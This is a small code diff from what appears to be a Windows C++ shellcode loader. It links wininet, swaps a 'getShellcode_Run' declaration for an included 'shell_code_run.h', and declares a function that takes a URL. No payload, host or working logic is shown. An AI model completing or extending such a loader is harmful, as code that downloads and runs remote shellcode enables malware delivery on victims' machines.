@@ -6,10 +6,7 @@
 
 #pragma comment(lib, "wininet")
 
-#define DEFAULT_BUFLEN 4096
-
 #include "get_buf.h"
+#include "shell_code_run.h"
 
-using namespace std;
-
-int getShellcode_Run(char recvbuf[DEFAULT_BUFLEN]);
+void doing(const char* url);
